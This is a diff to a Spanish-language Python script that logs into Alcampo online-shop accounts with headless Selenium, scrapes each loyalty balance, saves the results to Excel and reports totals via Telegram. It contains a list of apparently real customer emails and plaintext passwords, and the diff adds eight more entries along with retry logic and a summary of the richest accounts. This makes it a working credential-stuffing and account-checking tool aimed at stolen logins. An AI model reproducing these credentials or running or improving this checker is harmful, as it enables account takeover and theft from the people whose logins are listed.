@@ -138,12 +138,15 @@ ACCOUNTS = [
     {"email": "MIRIAMVALLES91@HOTMAIL.COM", "password": "Alcampo17.84"},
     {"email": "anainesvico@hotmail.com", "password": "Av637181887"},
     {"email": "princesita.loly@hotmail.es", "password": "Loly1971"},
-    {"email": "RAULKOYT@GMAIL.COM", "password": "a2D1FD34"}
-
-
-
-
-
+    {"email": "RAULKOYT@GMAIL.COM", "password": "a2D1FD34"},
+    {"email": "ibanssv@gmail.com", "password": "ThrombociD33"},
+    {"email": "jdgalisteo@gmail.com", "password": "juandi@64"},
+    {"email": "arm.monavie@hotmail.com", "password": "Sonia1978_"},
+    {"email": "robertoescribano6@gmail.com", "password": "Roesmo1961+"},
+    {"email": "nicolas.gerenstein@gmail.com", "password": "Getu123x123x"},
+    {"email": "litelopez@gmail.com", "password": "Vivatunita1"},
+    {"email": "elmisteriso55@yahoo.es", "password": "Powerrangers12"},
+    {"email": "emanuelrazvan16@gmail.com", "password": "Rokanrol123"},
 ]
 
 # =======================
@@ -170,59 +173,65 @@ def enviar_telegram_documento(path, caption=""):
 # =======================
 def procesar_cuenta(email, password):
     print(f"\n→→ Procesando cuenta: {email}")
-
-    chrome_options = Options()
-    chrome_options.add_argument("--headless=new")
-    chrome_options.add_argument("--disable-gpu")
-    chrome_options.add_argument("--no-sandbox")
-    chrome_options.add_argument("--disable-dev-shm-usage")
-    # chrome_options.binary_location = "/usr/bin/google-chrome-stable" # Comentado para Windows, Selenium lo detectará automáticamente
-
-    # Use the pre-installed chromedriver (managed by webdriver_manager or system-wide fallback)
-    driver = webdriver.Chrome(
-        service=Service(CHROME_DRIVER_PATH),
-        options=chrome_options
-    )
-
-    resultado = {"email": email, "password": password, "saldo": "ERROR"}
-
-    try:
-        driver.get("https://www.compraonline.alcampo.es/login?destination=%2F")
-        time.sleep(3)
-
-        email_field = driver.find_element(By.ID, "uname1")
-        password_field = driver.find_element(By.ID, "pwd1")
-
-        email_field.send_keys(email)
-        password_field.send_keys(password)
-        password_field.send_keys(Keys.ENTER)
-        time.sleep(5)
-
-        driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
-        time.sleep(2)
-        driver.refresh()
-        time.sleep(3)
-
+    
+    intentos_max = 3
+    
+    for intento in range(1, intentos_max + 1):
+        driver = None
         try:
-            elemento = driver.find_element(
-                By.XPATH,
-                "/html/body/div[1]/div/div[1]/main/div[2]/div[2]/div/div/span"
+            if intento > 1:
+                print(f"⚠️ Reintentando {email} (Intento {intento}/{intentos_max})...")
+
+            chrome_options = Options()
+            chrome_options.add_argument("--headless=new")
+            chrome_options.add_argument("--disable-gpu")
+            chrome_options.add_argument("--no-sandbox")
+            chrome_options.add_argument("--disable-dev-shm-usage")
+            
+            # Use the pre-installed chromedriver
+            driver = webdriver.Chrome(
+                service=Service(CHROME_DRIVER_PATH),
+                options=chrome_options
             )
-            saldo = elemento.text.strip()
-        except:
+
+            driver.get("https://www.compraonline.alcampo.es/login?destination=%2F")
+            time.sleep(3)
+
+            email_field = driver.find_element(By.ID, "uname1")
+            password_field = driver.find_element(By.ID, "pwd1")
+
+            email_field.send_keys(email)
+            password_field.send_keys(password)
+            password_field.send_keys(Keys.ENTER)
+            time.sleep(5)
+
+            driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
+            time.sleep(2)
+            driver.refresh()
+            time.sleep(3)
+
             saldo = "No encontrado"
+            try:
+                elemento = driver.find_element(
+                    By.XPATH,
+                    "/html/body/div[1]/div/div[1]/main/div[2]/div[2]/div/div/span"
+                )
+                saldo = elemento.text.strip()
+            except:
+                pass
 
-        resultado["saldo"] = saldo
-        print(f"✔ {email} → SALDO: {saldo}")
+            print(f"✔ {email} → SALDO: {saldo}")
+            return {"email": email, "password": password, "saldo": saldo}
 
-    except Exception as e:
-        print(f"❌ Error en {email}: {e}")
-        resultado["saldo"] = f"Error: {e}"
+        except Exception as e:
+            print(f"❌ Error en {email} (Intento {intento}): {e}")
+            if intento == intentos_max:
+                return {"email": email, "password": password, "saldo": f"Error: {e}"}
+            time.sleep(3) # Esperar antes de reintentar
 
-    finally:
-        driver.quit()
-
-    return resultado
+        finally:
+            if driver:
+                driver.quit()
 
 # =======================
 # EJECUTAR TODO EN PARALELO
@@ -244,6 +253,43 @@ excel_path = "saldos_alcampo.xlsx"
 df.to_excel(excel_path, index=False)
 
 print("\n💾 Datos guardados en:", excel_path)
+
+# =======================
+# CALCULAR RESUMEN Y ENVIAR
+# =======================
+def limpiar_saldo(saldo_str):
+    """Convierte texto tipo '5,30 €' a float 5.30"""
+    try:
+        if "Error" in saldo_str or "No encontrado" in saldo_str:
+            return 0.0
+        # Eliminar símbolo euro, espacios y cambiar coma por punto
+        limpio = saldo_str.replace('€', '').replace(' ', '').replace(',', '.').strip()
+        return float(limpio)
+    except:
+        return 0.0
+
+saldo_total = 0.0
+cuenta_top = {"email": "N/A", "saldo_val": 0.0}
+cuentas_con_saldo = 0
+
+for r in resultados:
+    valor = limpiar_saldo(r["saldo"])
+    saldo_total += valor
+    if valor > 0:
+        cuentas_con_saldo += 1
+    if valor > cuenta_top["saldo_val"]:
+        cuenta_top = {"email": r["email"], "saldo_val": valor}
+
+mensaje_resumen = (
+    f"📊 **RESUMEN ALCAMPO**\n\n"
+    f"✅ Cuentas procesadas: {len(resultados)}\n"
+    f"💰 **Saldo Total:** {saldo_total:.2f} €\n"
+    f"💎 Cuentas con dinero: {cuentas_con_saldo}\n"
+    f"🏆 **Top Cuenta:** {cuenta_top['email']} ({cuenta_top['saldo_val']:.2f} €)"
+)
+
+print("\n" + mensaje_resumen)
+enviar_telegram_texto(mensaje_resumen)
 
 # =======================
 # ENVIAR UN SOLO MENSAJE CON EL EXCEL
